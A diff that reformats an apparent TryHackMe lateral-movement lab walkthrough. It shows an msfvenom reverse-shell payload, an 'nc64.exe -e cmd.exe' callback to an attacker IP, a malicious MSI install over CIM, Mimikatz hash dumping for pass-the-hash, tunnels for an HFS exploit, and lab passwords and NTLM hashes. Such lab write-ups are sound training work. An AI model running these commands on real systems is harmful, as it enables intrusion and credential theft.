@@ -17,21 +17,22 @@ To start with the challenge, let's fetch the credentials for us from "*http://di
 Let's ssh login with the credentials we have.
 
 ```bash
-kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com   
+kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com
 The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.74.249)' can't be established.
 ED25519 key fingerprint is: SHA256:hWJ3UXi9CUvCPJiW5DHV03g8j1fvIFqqI9WL79LPj3A
 This host key is known by the following other names/addresses:
     ~/.ssh/known_hosts:173: [hashed name]
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'thmjmp2.za.tryhackme.com' (ED25519) to the list of known hosts.                                                                                    
+Warning: Permanently added 'thmjmp2.za.tryhackme.com' (ED25519) to the list of known hosts.
+
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-za\jenna.field@thmjmp2.za.tryhackme.com's password: 
-Microsoft Windows [Version 10.0.14393]                                                                                          
-(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+za\jenna.field@thmjmp2.za.tryhackme.com's password:
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-za\jenna.field@THMJMP2 C:\Users\jenna.field> 
+za\jenna.field@THMJMP2 C:\Users\jenna.field>
 ```
 
 # **Task - Spawning Processes Remotely**
@@ -41,10 +42,10 @@ Create a reverse shell payload with msfvenom.
 ```bash
 kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.3 LPORT=4444 -f exe-service -o pwnme64.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload                                                                                     
-No encoder specified, outputting raw payload                                                                                                   
-Payload size: 460 bytes                                                                                                                        
-Final size of exe-service file: 12288 bytes                                                                                                    
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 12288 bytes
 Saved as: pwnme64.exe
 ```
 
@@ -71,10 +72,10 @@ kali@kali:ssh t1_leonard.summers@thmjmp2.za.tryhackme.com
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-t1_leonard.summers@thmjmp2.za.tryhackme.com's password: 
+t1_leonard.summers@thmjmp2.za.tryhackme.com's password:
 
-Microsoft Windows [Version 10.0.14393]                                                                                          
-(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
 za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>
 ```
@@ -82,38 +83,27 @@ za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>
 Let's check if we have administrator privileges.
 
 ```bash
-za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>whoami /groups                                                        
+za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>whoami /groups
 
-GROUP INFORMATION                                                                                                               
------------------                                                                                                               
-
-Group Name                                 Type             SID                                           Attributes            
-                                                                                                                                                                                                                                            
-========================================== ================ ============================================= ======================                                                                                                            
-============================                                                                                                                                                                                                                
-Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-ZA\Tier 1 Admins                           Group            S-1-5-21-3330634377-1326264276-632209373-1105 Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabl                                                                                                            
-ed by default, Enabled group                                                                                                                                                                                                                
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                         
+GROUP INFORMATION
+-----------------
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+ZA\Tier 1 Admins                           Group            S-1-5-21-3330634377-1326264276-632209373-1105 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 ```
 
 So, we are Tier 1 admin. Now, we can upload our file to thmiis share.
 
 ```bash
-kali@kali:smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put pwnme64.exe' --option="client min protocol=core"                                                                                                                                  
+kali@kali:smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put pwnme64.exe' --option="client min protocol=core"
 putting file pwnme64.exe as \pwnme64.exe (11.5 kB/s) (average 11.5 kB/s)
 ```
 
@@ -134,12 +124,11 @@ kali@kali:penelope -p 4445
 From the ssh terminal, use runas to get a reverse shell.
 
 ```bash
-za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc6               
-4.exe -e cmd.exe 10.150.74.3 4445"                                                                                                             
-Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:                                                                                    
-Attempting to start c:\tools\nc64.exe -e cmd.exe 10.150.74.3 4445 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ...                            
-                                                                                                                                               
-za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers> 
+za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.150.74.3 4445"
+Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:
+Attempting to start c:\tools\nc64.exe -e cmd.exe 10.150.74.3 4445 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ...
+
+za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>
 ```
 
 ```bash
@@ -148,9 +137,9 @@ kali@kali:penelope -p 4445
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from 10.200.74.249-WINDOWS 😍 Assigned SessionID <1>
 [+] Added readline support...
-[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
+[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
 [+] Logging to /home/kali/.penelope/sessions/10.200.74.249-WINDOWS/2026_02_17-11_55_07-992.log 📜
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 C:\Windows\system32>whoami
 whoami
 za\t1_leonard.summers
@@ -195,7 +184,7 @@ kali@kali:penelope -p 4444
 [+] Added readline support...
 [+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
 [+] Logging to /home/kali/.penelope/sessions/10.200.74.201-WINDOWS/2026_02_17-12_13_07-791.log 📜
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 C:\Windows\system32>hostname
 hostname
 THMIIS
@@ -245,21 +234,20 @@ kali@kali:ssh t1_corine.waters@za.tryhackme.com@thmjmp2.za.tryhackme.com
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-t1_corine.waters@za.tryhackme.com@thmjmp2.za.tryhackme.com's password: 
+t1_corine.waters@za.tryhackme.com@thmjmp2.za.tryhackme.com's password:
 
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-Microsoft Windows [Version 10.0.14393]                                                                                          
-(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
-
-za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters> 
+za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters>
 ```
 
 Enable powershell.
 
 ```bash
-za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters>powershell                                                                
-Windows PowerShell                                                                                                              
-Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  
+za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters>powershell
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
 
 PS C:\Users\t1_corine.waters>   
 ```
@@ -267,26 +255,27 @@ PS C:\Users\t1_corine.waters>
 Set the required variables to install the package in THMIIS.
 
 ```powershell
-PS C:\Users\t1_corine.waters> $username = 't1_corine.waters';                                                                   
-PS C:\Users\t1_corine.waters> $password = 'Korine.1994';                                                                        
-PS C:\Users\t1_corine.waters> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                           
-PS C:\Users\t1_corine.waters> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;    
-PS C:\Users\t1_corine.waters> $Opt = New-CimSessionOption -Protocol DCOM                                                        
-PS C:\Users\t1_corine.waters> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop                                                                                                     
+PS C:\Users\t1_corine.waters> $username = 't1_corine.waters';
+PS C:\Users\t1_corine.waters> $password = 'Korine.1994';
+PS C:\Users\t1_corine.waters> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\Users\t1_corine.waters> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\Users\t1_corine.waters> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\Users\t1_corine.waters> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
 PS C:\Users\t1_corine.waters>
 ```
 
 The variables are set, let's invoke the installation.
 
 ```powershell
-PS C:\Users\t1_corine.waters> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\pwnme.msi"; Options = ""; AllUsers = $false}                                                        
+PS C:\Users\t1_corine.waters> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\pwnme.msi";
+Options = ""; AllUsers = $false}
 
-ReturnValue PSComputerName                                                                                                      
------------ --------------                                                                                                      
-       1603 thmiis.za.tryhackme.com                                                                                             
+ReturnValue PSComputerName
+----------- --------------
+       1603 thmiis.za.tryhackme.com
 
-
-PS C:\Users\t1_corine.waters> 
+PS C:\Users\t1_corine.waters>
 ```
 
 Should receive the reverse shell.
@@ -297,8 +286,8 @@ kali@kali:penelope -p 4449
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from THMIIS~10.200.74.201-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
 [+] Added readline support...
-[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
-[+] Logging to /home/kali/.penelope/sessions/THMIIS~10.200.74.201-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_17-12_47_05-617.log 📜                                                                                                                                          
+[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
+[+] Logging to /home/kali/.penelope/sessions/THMIIS~10.200.74.201-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_17-12_47_05-617.log 📜
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 C:\Windows\system32>hostname
 hostname
@@ -324,51 +313,49 @@ kali@kali:ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password: 
+za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password:
 
-Microsoft Windows [Version 10.0.14393]                                                                                          
-(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean> 
+za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>
 ```
 
 Run this command to launch a PowerShell script like Mimikatz while ignoring all security restrictions and warnings that would normally block it.
 
 ```powershell
-PS C:\Users\t2_felicia.dean> powershell.exe -ExecutionPolicy Bypass                                                             
-Windows PowerShell                                                                                                              
-Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  
+PS C:\Users\t2_felicia.dean> powershell.exe -ExecutionPolicy Bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
 ```
 
 ```powershell
-PS C:\Users\t2_felicia.dean> ls C:/tools                                                                                          
-                                                                                                                                               
-                                                                                                                                               
-    Directory: C:\tools                                                                                                                        
-                                                                                                                                               
-                                                                                                                                               
-Mode                LastWriteTime         Length Name                                                                                          
-----                -------------         ------ ----                                                                                          
-d-----        6/19/2022   5:38 AM                socat                                                                                         
-------        8/10/2021   3:22 PM        1355680 mimikatz.exe                                                                                  
--a----        6/14/2022   8:27 PM          45272 nc64.exe                                                                                      
--a----        4/19/2022   9:17 PM        1078672 PsExec64.exe                                                                                  
--a----        3/16/2022   5:19 PM         906752 SharpHound.exe 
+PS C:\Users\t2_felicia.dean> ls C:/tools
+
+    Directory: C:\tools
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/19/2022   5:38 AM                socat
+------        8/10/2021   3:22 PM        1355680 mimikatz.exe
+-a----        6/14/2022   8:27 PM          45272 nc64.exe
+-a----        4/19/2022   9:17 PM        1078672 PsExec64.exe
+-a----        3/16/2022   5:19 PM         906752 SharpHound.exe
 ```
 
 We have mimikatz in our tools folder.
 
 ```powershell
-PS C:\Users\t2_felicia.dean> C:\tools\mimikatz.exe                                                                                             
-                                                                                                                                               
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                                                                                   
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                    
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                       
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                        
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                      
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                      
-                                                                                                                                               
-mimikatz #  
+PS C:\Users\t2_felicia.dean> C:\tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
 ```
 
 Elevate the privileges.
@@ -391,30 +378,30 @@ SID name  : NT AUTHORITY\SYSTEM
 Let's drop the hashes.
 
 ```bash
-mimikatz # sekurlsa::msv                                                                                                                       
-                                                                                                                                               
-Authentication Id : 0 ; 1596340 (00000000:00185bb4)                                                                                            
-Session           : NetworkCleartext from 0                                                                                                    
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 1596340 (00000000:00185bb4)
+Session           : NetworkCleartext from 0
 User Name         : t2_felicia.dean
 .
 .
 .
 .
 .
-Authentication Id : 0 ; 675303 (00000000:000a4de7)                                                                                             
-Session           : RemoteInteractive from 3                                                                                                   
-User Name         : t1_toby.beck                                                                                                               
-Domain            : ZA                                                                                                                         
-Logon Server      : THMDC                                                                                                                      
-Logon Time        : 2/17/2026 7:03:02 AM                                                                                                       
-SID               : S-1-5-21-3330634377-1326264276-632209373-4607                                                                              
-        msv :                                                                                                                                  
-         [00000003] Primary                                                                                                                    
-         * Username : t1_toby.beck                                                                                                             
-         * Domain   : ZA                                                                                                                       
-         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                         
-         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                 
-         * DPAPI    : d9cd92937c7401805389fbb51260c45f 
+Authentication Id : 0 ; 675303 (00000000:000a4de7)
+Session           : RemoteInteractive from 3
+User Name         : t1_toby.beck
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2/17/2026 7:03:02 AM
+SID               : S-1-5-21-3330634377-1326264276-632209373-4607
+        msv :
+         [00000003] Primary
+         * Username : t1_toby.beck
+         * Domain   : ZA
+         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
+         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
+         * DPAPI    : d9cd92937c7401805389fbb51260c45f
 ```
 
 We have NTLM hash for user t1_toby.beck. Now, we can login with this hash with evil-winrm.
@@ -510,23 +497,23 @@ We find our flag in the screeen.
 Let's login via ssh with the credentials we generated at first.
 
 ```bash
-kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com                                                                                             
+kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-za\jenna.field@thmjmp2.za.tryhackme.com's password: 
-Microsoft Windows [Version 10.0.14393]                                                                                          
-(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+za\jenna.field@thmjmp2.za.tryhackme.com's password:
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-za\jenna.field@THMJMP2 C:\Users\jenna.field> 
+za\jenna.field@THMJMP2 C:\Users\jenna.field>
 ```
 
 Let's run powershell.
 
 ```bash
-za\jenna.field@THMJMP2 C:\Users\jenna.field>powershell                                                                          
-Windows PowerShell                                                                                                              
-Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  
+za\jenna.field@THMJMP2 C:\Users\jenna.field>powershell
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
 ```
 
 Let's use socat to forward the THMIIS 3389(RDP) port, so that we can login.
@@ -558,20 +545,20 @@ Press any key to continue . . .
 Since, we know THMDC has a vulnerable HFS at port 80, we can port forward it. Similarly, as this exploit needs a listener and a server, we create 2 more port forwards so that, we can send the payload, and receive the payload from our attacker machine via THMJMP2, as we cannot directly access the THMDC.
 
 ```bash
-kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com -L 8888:thmdc.za.tryhackme.com:80 -R 6667:127.0.0.1:6666 -R 8082:127.0.0.1:8081 -N            
+kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com -L 8888:thmdc.za.tryhackme.com:80 -R 6667:127.0.0.1:6666 -R 8082:127.0.0.1:8081 -N
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-za\jenna.field@thmjmp2.za.tryhackme.com's password: 
+za\jenna.field@thmjmp2.za.tryhackme.com's password:
 ```
 
 From THMJMP2, create 2 listener, and forward them to our attacker machine.
 
 ```powersell
-PS C:\tools\socat> ./socat.exe TCP4-LISTEN:6666,fork,bind=0.0.0.0 TCP4:127.0.0.1:6667                                           
+PS C:\tools\socat> ./socat.exe TCP4-LISTEN:6666,fork,bind=0.0.0.0 TCP4:127.0.0.1:6667
 ```
 ```powershell
-PS C:\tools\socat> ./socat.exe TCP4-LISTEN:8081,fork,bind=0.0.0.0 TCP4:127.0.0.1:8082                                                          
+PS C:\tools\socat> ./socat.exe TCP4-LISTEN:8081,fork,bind=0.0.0.0 TCP4:127.0.0.1:8082
 ```
 
 Set the metasploit, and configure all options.
